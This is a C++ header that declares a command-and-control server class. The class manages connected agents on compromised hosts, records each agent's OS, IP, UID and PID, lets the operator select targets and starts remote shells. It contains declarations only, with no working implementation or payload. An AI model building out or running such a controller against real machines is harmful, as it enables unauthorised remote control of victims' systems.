#include "SShClient.h"
#include "net/HttpRequest.h"
#include "FileManager.h"

#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <iostream>
#include <thread>
#include <map>
#include <mutex>
#include <condition_variable>

#include "../../../Log/easylogging++.h"

struct Information {
    string os_;
    string ip_;
    int    port_;
    int    uid_;
    int    pid_;

    int ccFd;
    int fileFd;

    ~Information()
    {
        close(ccFd);
        close(fileFd);
    }
};

class AgentResource {
public:
    AgentResource()
        : Information_(nullptr),
          HttpClient_(nullptr),
          SShClient_(nullptr) {}

    std::shared_ptr<Information>  Information_;
    std::shared_ptr<HttpResponse> HttpClient_;
    std::shared_ptr<SShClient>    SShClient_;
    int                           id_;

    ~AgentResource()
    {
        /* enn... */
    }
};

class CC {
public:
    CC(string ip, int ccPort, int filePort)
        : curId_(-1), ccIp_(ip), fileManager_(FileManager::getInstance()) {
        ports_.push_back(ccPort);
        ports_.push_back(filePort);
        CC_print_logo();
        _start_CC_Listener();
    }

public:
    // CC-CMD-FUNC
    int    CC_rshell_start(int id);
    int    CC_target_select(int id);
    void   CC_target_list();
    void   CC_target_current();
    void   CC_help_printf();
    void   CC_print_linePrompt(int id);
    void   CC_print_logo();
    void   msg_notify(string& msg, bool enter = true);
    string CC_get_line(int* id);

public:
    void _start_CC_Listener();
    // void _start_File_Listener();
    int utils(int fd);

    // 增、删、访问队列
    AgentResource* getAgent(int id);
    int  addAgent(int fd, int fd2, struct sockaddr_in* clientAddr_);
    void delAgent(int id);
    std::map<string, int>& getCMDS_() {
        return cmds_;
    }
    static ::std::map<string, int> CMDS_;

private:
    int                                           curId_; // thread safe?
    string                                        ccIp_;
    std::vector<int>                              ports_;
    static std::map<string, int>                  cmds_;
    std::vector<std::thread>                      threads_;
    std::shared_ptr<FileManager>                  fileManager_;
    std::mutex                                    agentsMutex_;
    std::condition_variable                       agentsConn_;
    std::map<int, std::shared_ptr<AgentResource>> agentMaps_;

    enum ReturnNum {
        SUCCESS = -100,
        ERROR,
        CLOSE,
        STOP,
    };
};